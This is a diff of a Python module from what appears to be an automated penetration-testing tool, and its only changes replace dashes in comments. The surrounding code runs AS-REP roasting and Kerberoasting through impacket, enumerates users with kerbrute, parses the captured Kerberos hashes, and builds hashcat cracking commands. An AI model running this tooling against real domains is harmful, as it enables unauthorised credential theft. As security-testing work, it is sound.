@@ -1,15 +1,15 @@
-"""Active Kerberos — AS-REP roasting and Kerberoasting (execute, don't just suggest).
+"""Active Kerberos - AS-REP roasting and Kerberoasting (execute, don't just suggest).
 
 The AD kill-chain composer (`adchain`) *names* the roasting steps; this module
 *runs* the two that pay off earliest:
 
-* **AS-REP roast** — no credentials needed: any account with "do not require
+* **AS-REP roast** - no credentials needed: any account with "do not require
   pre-auth" hands back a crackable AS-REP. `impacket-GetNPUsers` against a user list.
-* **Kerberoast** — with any domain credential, request every SPN's TGS for offline
+* **Kerberoast** - with any domain credential, request every SPN's TGS for offline
   cracking. `impacket-GetUserSPNs -request`.
 
-The deterministic core is the *parser*: it turns the tool output (`$krb5asrep$…`,
-`$krb5tgs$…`) into findings + `kind="hash"` credentials, so the hashes flow straight
+The deterministic core is the *parser*: it turns the tool output (`$krb5asrep$...`,
+`$krb5tgs$...`) into findings + `kind="hash"` credentials, so the hashes flow straight
 into the `crack` loop. Command builders fill in domain/DC/user; the CLI runs them
 through an injectable runner (so tests never touch the network).
 """
@@ -26,7 +26,7 @@ _TGS_RE = re.compile(r"\$krb5tgs\$[^\s]+")
 _ASREP_USER_RE = re.compile(r"\$krb5asrep\$\d+\$([^@:]+)@", re.IGNORECASE)
 # hashcat TGS format: $krb5tgs$23$*user$realm$spn*$checksum$edata
 # The user field itself can contain a `$` (machine-accounts end in `$`), so the
-# stop character is the following `$REALM$` — i.e. `$` followed by an uppercase
+# stop character is the following `$REALM$` - i.e. `$` followed by an uppercase
 # letter/digit start of the realm, not the plain `$` inside `WEB01$`.
 _TGS_USER_RE = re.compile(
     r"\$krb5tgs\$\d+\$\*([^*]+?)\$[A-Z0-9]", re.IGNORECASE)
@@ -51,7 +51,7 @@ def kerberoast_command(domain: str, dc_ip: str, user: str, password: str,
 
 
 def userenum_command(domain: str, dc_ip: str, userlist: str) -> list[str]:
-    """kerbrute userenum argv — valid-user discovery without lockout risk."""
+    """kerbrute userenum argv - valid-user discovery without lockout risk."""
     return ["kerbrute", "userenum", "-d", domain, "--dc", dc_ip, userlist]
 
 
@@ -92,7 +92,7 @@ def _hash_finding(kind: str, user: str, h: str, mode: str,
                     f"(hashcat -m {mode}) and reuse the plaintext.",
         evidence=h[:400],
         exploit=f"hashcat -m {mode} '{h[:60]}...' /usr/share/wordlists/rockyou.txt",
-        # We actually pulled the hash off the wire — that is proof, not a guess.
+        # We actually pulled the hash off the wire - that is proof, not a guess.
         validation="confirmed", proof=f"recovered {kind} hash for {user}",
     )
 
